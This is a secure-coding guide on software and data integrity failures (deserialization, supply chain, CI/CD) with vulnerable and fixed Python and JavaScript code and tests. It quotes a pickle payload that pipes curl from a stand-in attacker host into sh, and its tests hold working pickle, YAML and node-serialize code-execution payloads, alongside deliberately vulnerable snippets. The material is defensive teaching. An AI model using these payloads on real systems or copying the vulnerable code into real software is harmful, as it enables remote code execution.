# A08 — Software and Data Integrity Failures

## What it is

Software and data integrity failures are bugs where an application trusts code, data, or updates without verifying that they are authentic and unmodified. The category was new in 2021, added to capture the class of attacks where the exploit does not target the application directly — it targets the supply chain, the CI/CD pipeline, or the deserialization path that accepts attacker-supplied objects.

Three subcategories sit inside A08:

1. **Supply chain integrity** — pulling a dependency, a container image, or a CI action without verifying it is what you think it is (wrong signature, typosquat, compromised maintainer account).
2. **Insecure deserialization** — `pickle.loads`, `yaml.load`, Java `ObjectInputStream`, PHP `unserialize`, Node `node-serialize` — attacker-controlled bytes become attacker-controlled code.
3. **Auto-update and CI/CD trust** — a pipeline that deploys whatever a branch contains, without signed commits, code review, or artifact attestation, is one stolen laptop away from shipping a backdoor to production.

A07 (authentication) protects the front door. A08 protects the door the attacker would rather use — the one the build system walks through on every deploy.

## Why it matters

A concrete exploit: a Python data-processing service accepts model artifacts uploaded by customers, stored in S3, and loaded into the worker process with `pickle.loads`. An attacker uploads a pickle whose `__reduce__` returns `(os.system, ("curl evil.example.com/x | sh",))`. When the worker loads the model, the pickle's reduce protocol executes the command with the worker's IAM role. The worker has `s3:GetObject` on customer buckets and `secretsmanager:GetSecretValue` on the shared DB credential. The attacker has code execution and two high-value capabilities within seconds of upload.

The fix is to never deserialize pickle from untrusted sources. Model artifacts ship in `safetensors` or ONNX; configuration ships in JSON or YAML safe-load; RPC arguments go through a schema (Protobuf, JSON Schema, pydantic). If pickle is unavoidable for legacy reasons, wrap it with a signature check using a key the producer holds and the consumer trusts.

Other common shapes:

- **Unsigned container images pulled into production** — `FROM nginx:latest` with no digest pin.
- **CI workflow that runs on PRs from forks with secrets attached** — a fork-author can exfiltrate production credentials with one PR.
- **GitHub Actions pinned by tag, not SHA** — a malicious maintainer (or a compromised one) force-pushes the tag to a version with a payload.
- **Auto-update channel without signature verification** — a desktop app downloads `update.zip` over HTTPS and extracts it; MITM or compromised CDN serves a payload.
- **YAML config loaded with `yaml.load`** — any untrusted YAML becomes arbitrary Python.
- **Software bill of materials not produced** — you cannot answer "are we affected by CVE-X" without an SBOM.

## How to find it

**Manual review indicators.** Any `pickle.loads`, `pickle.load`, `yaml.load`, `jsonpickle.decode`, Node `node-serialize.unserialize`, `eval`, `new Function`, or `vm.runInThisContext` where the input is, or could be, attacker-controlled. Any Docker `FROM` without a digest; any GitHub Actions `uses:` without a commit SHA. Any CI workflow with `pull_request_target:` that runs untrusted code with write permissions or secrets. Any auto-update code path that downloads-and-executes without verifying a signature. Any build system that does not produce an SBOM.

**Automated signals.**

- Semgrep: `python.lang.security.deserialization.pickle.avoid-pickle`, `python.lang.security.audit.yaml-load`, `python.lang.security.insecure-deserialization.yaml-load`.
- Semgrep: `javascript.lang.security.audit.node-serialize`, `javascript.lang.security.audit.eval`, `javascript.lang.security.audit.vm-run-in-context`.
- Semgrep: `generic.ci.security.github-actions-pinned-by-tag` and rules for `pull_request_target` with checkout of PR head.
- Bandit: `B301` (pickle use), `B506` (yaml.load).
- Snyk Code: `javascript/UnsafeDeserialization`, `javascript/CodeInjection`.
- Supply-chain: Sigstore cosign for image signature verification, SLSA provenance attestations on CI artifacts, Syft / Trivy for SBOM generation, GitHub's `dependency-review-action` and Dependabot for pre-merge gating.

## How to fix it — Python

**Vulnerable.**
```python
# Pickle on untrusted input — arbitrary code execution.
import pickle
from fastapi import FastAPI, UploadFile

app = FastAPI()

@app.post("/model")
async def load_model(upload: UploadFile):
    data = await upload.read()
    model = pickle.loads(data)          # RCE
    return {"classes": list(model.classes_)}

# yaml.load without SafeLoader — same problem, different package.
import yaml

def load_config(raw: bytes):
    return yaml.load(raw)               # RCE via !!python/object
```

**Secure.**
```python
# Accept a format that does not execute code on load. safetensors is
# tensor-only; any metadata is data, never callables.
from safetensors.numpy import load as safetensors_load
from fastapi import FastAPI, UploadFile, HTTPException

@app.post("/model")
async def load_model(upload: UploadFile):
    data = await upload.read()
    if not data.startswith(b"\x00\x00") or len(data) > 500 * 1024 * 1024:
        raise HTTPException(400, "Invalid or too-large model")
    try:
        tensors = safetensors_load(data)
    except Exception:
        raise HTTPException(400, "Malformed model file")
    return {"tensors": list(tensors.keys())}

# If the producer/consumer boundary is internal and you own both ends,
# sign the payload and verify on load — but still prefer a safe
# format. This pattern is for legacy compatibility only.
import hmac, hashlib, os

SIGNING_KEY = os.environ["ARTIFACT_SIGNING_KEY"].encode()

def verify_signed_artifact(body: bytes, signature_hex: str) -> bool:
    expected = hmac.new(SIGNING_KEY, body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, signature_hex)

# yaml.safe_load — only plain scalars, sequences, mappings. No
# constructors, no Python object instantiation.
def load_config(raw: bytes):
    return yaml.safe_load(raw)
```

For the pipeline side, pin actions to a commit SHA, generate an SBOM, and require a signature on images published from CI:

```yaml
# .github/workflows/release.yml — excerpt
jobs:
  build:
    permissions:
      id-token: write        # OIDC for cosign keyless signing
      contents: read
      packages: write
    steps:
      # Pin by SHA, not tag — a tag can be force-pushed.
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11   # v4.1.1
      - uses: docker/build-push-action@4f58ea79222b3b9dc2c8bbdd6debcef730109a75  # v6.9.0
        with:
          push: true
          tags: ghcr.io/acme/app:${{ github.sha }}
      - uses: anchore/sbom-action@61119d458adab75f756bc0b9e4bde25725f86a7a  # v0.17.2
        with:
          image: ghcr.io/acme/app:${{ github.sha }}
          format: spdx-json
      - uses: sigstore/cosign-installer@4959ce089c160fddf62f7b42464195ba1a56d382  # v3.6.0
      - run: cosign sign --yes ghcr.io/acme/app:${{ github.sha }}
```

## How to fix it — JavaScript

**Vulnerable.**
```javascript
// node-serialize.unserialize on untrusted input — RCE via IIFE body.
const serialize = require("node-serialize");
const express = require("express");
const app = express();

app.post("/state", express.text(), (req, res) => {
  const state = serialize.unserialize(req.body);   // RCE
  res.json({ state });
});

// Auto-update that downloads and executes without signature verify.
const { execSync } = require("child_process");
const https = require("https");

function applyUpdate(url, destPath) {
  https.get(url, (stream) => {
    const out = fs.createWriteStream(destPath);
    stream.pipe(out).on("finish", () => execSync(destPath));
  });
}
```

**Secure.**
```javascript
// Accept a schema-validated JSON structure. No constructor invocation,
// no function bodies interpreted, no prototype pollution surface.
const { z } = require("zod");

const StateSchema = z.object({
  version: z.number().int().positive(),
  items: z.array(z.object({
    id: z.string().uuid(),
    count: z.number().int().min(0),
  })).max(1000),
}).strict();

app.post("/state", express.json({ limit: "256kb" }), (req, res) => {
  const parsed = StateSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "invalid state" });
  res.json({ state: parsed.data });
});

// Auto-update: download to a temp file, verify a detached signature
// against a pinned public key, and only then execute. The public key
// ships with the application; the signing key is held offline.
const crypto = require("crypto");
const fs = require("fs");

const UPDATE_PUBKEY_PEM = fs.readFileSync("/opt/app/keys/update.pub", "utf8");

function verifyUpdate(bundlePath, sigPath) {
  const bundle = fs.readFileSync(bundlePath);
  const signature = fs.readFileSync(sigPath);
  const verifier = crypto.createVerify("RSA-SHA256");
  verifier.update(bundle);
  if (!verifier.verify(UPDATE_PUBKEY_PEM, signature)) {
    throw new Error("update signature did not verify");
  }
}

function applyUpdate(bundlePath, sigPath) {
  verifyUpdate(bundlePath, sigPath);
  execFileSync(bundlePath, [], { stdio: "inherit" });
}
```

For the CI side, restrict `pull_request_target` to jobs that do not check out PR code, and require signed commits on protected branches:

```yaml
# .github/workflows/ci.yml — safer pattern
on:
  pull_request:            # Runs with read-only GITHUB_TOKEN, no secrets exposed to forks.
    branches: [main]

jobs:
  test:
    permissions:
      contents: read       # Never write on untrusted code.
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11   # pinned SHA
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af   # pinned SHA
      - run: npm ci
      - run: npm test
```

## How to test the fix

**pytest (Python).**
```python
import pickle, os

class _PickleRCE:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

def test_pickle_payload_is_rejected(tmp_path, client):
    payload = pickle.dumps(_PickleRCE())
    resp = client.post("/model", files={"upload": ("m.pkl", payload)})
    assert resp.status_code == 400           # Safe format required, not pickle.
    assert not os.path.exists("/tmp/pwned")  # Reduce did not execute.

def test_yaml_python_object_tag_is_rejected():
    malicious = b"!!python/object/apply:os.system ['touch /tmp/yaml_pwn']"
    with pytest.raises(yaml.YAMLError):
        load_config(malicious)               # safe_load refuses the tag.

def test_signed_artifact_verification():
    body = b"model-bytes"
    good_sig = hmac.new(SIGNING_KEY, body, hashlib.sha256).hexdigest()
    assert verify_signed_artifact(body, good_sig) is True
    assert verify_signed_artifact(body, "00" * 32) is False
    assert verify_signed_artifact(body + b"tamper", good_sig) is False
```

**Jest (JavaScript).**
```javascript
describe("deserialization and update integrity", () => {
  it("rejects a node-serialize IIFE payload on the state endpoint", async () => {
    // The payload that would execute under unserialize:
    const payload = `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('touch /tmp/pwned')}()"}`;
    const res = await request(app)
      .post("/state")
      .set("content-type", "application/json")
      .send(payload);
    expect(res.status).toBe(400);
    expect(fs.existsSync("/tmp/pwned")).toBe(false);
  });

  it("rejects an update bundle whose signature does not verify", () => {
    const bundle = path.join(tmp, "update.bin");
    const sig = path.join(tmp, "update.sig");
    fs.writeFileSync(bundle, "tampered payload");
    fs.writeFileSync(sig, Buffer.from("00".repeat(256), "hex"));
    expect(() => verifyUpdate(bundle, sig)).toThrow(/signature did not verify/);
  });

  it("rejects state with unknown keys (strict schema)", async () => {
    const res = await request(app)
      .post("/state")
      .send({ version: 1, items: [], __proto__: { polluted: true } });
    expect(res.status).toBe(400);
    expect({}.polluted).toBeUndefined();
  });
});
```

## Compliance mapping

| Framework | Control | Relevance |
| --- | --- | --- |
| **HIPAA Security Rule** | §164.312(c)(1) — Integrity | Protect ePHI from improper alteration; signed artifacts and safe deserialization prevent tampering. |
| **HIPAA Security Rule** | §164.312(c)(2) — Mechanism to Authenticate ePHI | Verify ePHI has not been altered or destroyed in an unauthorized manner — signatures, HMAC, secure hashes. |
| **HIPAA Security Rule** | §164.308(a)(1)(ii)(D) — Information System Activity Review | Build/deploy logs are part of the activity reviewed. |
| **SOC 2 Trust Services Criteria** | CC7.1 — Detection and Monitoring of System Vulnerabilities | Supply-chain scanning, SBOM, image signature verification are detective controls. |
| **SOC 2 Trust Services Criteria** | CC8.1 — Change Management | Signed commits, protected branches, artifact attestation, reproducible builds are the integrity side of change management. |
| **NIST CSF 2.0** | ID.SC — Cybersecurity Supply Chain Risk Management | The whole category. |
| **NIST CSF 2.0** | PR.DS-06 — Integrity checking mechanisms are used to verify software, firmware, and information integrity | Signature verification on updates, checksums on artifacts. |
| **NIST CSF 2.0** | PR.PS-02 — Software is maintained, replaced, and removed | Includes controls on how software enters the environment. |

For PCI-DSS v4, this maps to Requirement 6.3.2 (maintain an inventory of bespoke and custom software), Requirement 6.5.2 (software changes are reviewed prior to deployment), and Requirement 6.3.3 (system components are protected from known vulnerabilities). The supply-chain elements additionally map to Requirement 12.8 (third-party service provider management).
